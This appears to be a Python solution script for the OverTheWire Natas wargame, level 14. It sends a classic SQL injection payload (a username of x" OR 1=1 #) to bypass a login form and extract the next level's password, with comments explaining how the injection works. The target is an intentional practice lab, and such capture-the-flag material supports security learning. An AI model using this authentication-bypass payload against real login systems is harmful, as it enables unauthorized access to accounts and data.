#!/bin/python3

import requests
import re
import html.parser

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = 'http://%s.natas.labs.overthewire.org' % (username)
data = { "username" : "x\" OR 1=1 #",  "password" : "testing" }
#files = { "uploadedfile" : open("phpinject13.php", "rb") } 
#cookie = { "data" : "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"}

#for communicating with the website whilst maintaining session history
session = requests.Session()
response = session.post(url + '',data = data,auth = (username,password) )

content = html.unescape(response.text)
#print (content)

print (re.findall('Successful login! The password for natas15 is (.*)<br>',content)[0]) 


#this one is sql injection
#the backend takes username and password as user input 
#and puts it directly into an sql query 
#this means we can build a query that will dump the database
#query is SELECT * from users where username = [username] and password = [password] 
#we can set username to be 'x" OR 1=1#' 
#this will comment out the password and will return true 
